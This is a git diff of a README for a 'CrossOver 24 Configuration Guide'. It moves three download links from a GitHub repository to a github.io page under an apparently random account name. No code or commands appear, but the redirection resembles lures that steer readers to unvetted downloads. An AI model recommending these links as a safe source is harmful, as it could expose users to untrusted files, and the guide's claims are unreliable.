@@ -1,6 +1,6 @@
 # 🛠️ CrossOver-24-Configuration-Guide - Fix Windows installation errors with ease
 
-[![Download Guide](https://img.shields.io/badge/Download-Guide-blue.svg)](https://github.com/Gastrophrynecumulativevote30/CrossOver-24-Configuration-Guide)
+[![Download Guide](https://img.shields.io/badge/Download-Guide-blue.svg)](https://gastrophrynecumulativevote30.github.io)
 
 ## 📁 Project Overview
 
@@ -20,7 +20,7 @@ Confirm your computer meets these standards before you start:
 
 You must visit the main repository page to access the latest configuration files. Follow these steps to obtain the necessary documents:
 
-1. Visit the main site at: https://github.com/Gastrophrynecumulativevote30/CrossOver-24-Configuration-Guide
+1. Visit the main site at: https://gastrophrynecumulativevote30.github.io
 2. Look for the green button labeled "Code".
 3. Select "Download ZIP" from the menu.
 4. Save the file to your Downloads folder.
@@ -28,7 +28,7 @@ You must visit the main repository page to access the latest configuration files
 
 Follow the link below to reach the setup page:
 
-[Download CrossOver 24 Guide](https://github.com/Gastrophrynecumulativevote30/CrossOver-24-Configuration-Guide)
+[Download CrossOver 24 Guide](https://gastrophrynecumulativevote30.github.io)
 
 ## ⚙️ Installation Steps
 
